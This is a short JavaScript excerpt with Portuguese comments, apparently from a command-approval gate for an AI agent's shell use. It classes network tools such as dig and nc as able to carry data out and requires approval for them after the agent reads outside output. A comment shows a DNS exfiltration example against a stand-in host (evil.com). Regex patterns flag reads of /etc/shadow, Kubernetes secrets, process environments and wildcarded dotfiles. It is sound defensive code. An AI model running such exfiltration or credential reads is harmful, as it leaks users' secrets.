...
const LEITURA = {
  ...
  // `rede: true` = fala com um destino ESCOLHIDO no comando. Continuam sendo
  // leitura (não alteram nada), mas levam dado para fora: `dig <dado>.evil.com`
  // exfiltra por DNS o que o passo anterior leu. Depois que o agente lê saída
  // de fora, o portão passa a pedir aprovação para estes — ver decidirAprovacao.
  dig: { rede: true }, nslookup: { rede: true }, host: { rede: true },
  whois: { rede: true }, traceroute: { rede: true },
  mtr: { rede: true }, nc: { apenas: ['-z'], rede: true },
  ping: { rede: true }, ping6: { rede: true }, getent: { rede: true },
...
const CAMINHOS_SENSIVEIS = [
  ...
  [/\/proc\/(\d+|self)\/environ|\/dev\/mem|\/dev\/kmem/, 'memória ou ambiente de outro processo'],
  // Os padrões acima casam a grafia literal. Estes fecham os desvios: pedir o
  // segredo a quem o guarda (getent, kubectl) e o curinga, que lê o arquivo
  // sensível sem escrever o nome dele — `cat /etc/sh*`, `cat ~/.s*/id_*`.
  [/\bgetent\s+g?shadow\b/, 'arquivo de senhas do sistema'],
  [/\bkubectl\s+get\s+secrets?\b/, 'os Secrets do cluster'],
  [/\/etc\/[^/\s"']*[*?[]/, 'um curinga direto em /etc — não dá para saber o que seria lido'],
  [/(^|[\s"'/])\.[^/\s"']*[*?[]/, 'um curinga em arquivo oculto — não dá para saber o que seria lido'],
];

// Devolve o motivo se o comando toca algum caminho sensível, ou null.
function caminhoSensivel(cmd) {
  // `/etc/./shadow` e `/etc//shadow` são o mesmo arquivo para o shell e não
  // eram para a expressão regular. Normaliza antes de comparar.
  const texto = String(cmd || '').replace(/\/(?:\.\/)+/g, '/').replace(/\/{2,}/g, '/');
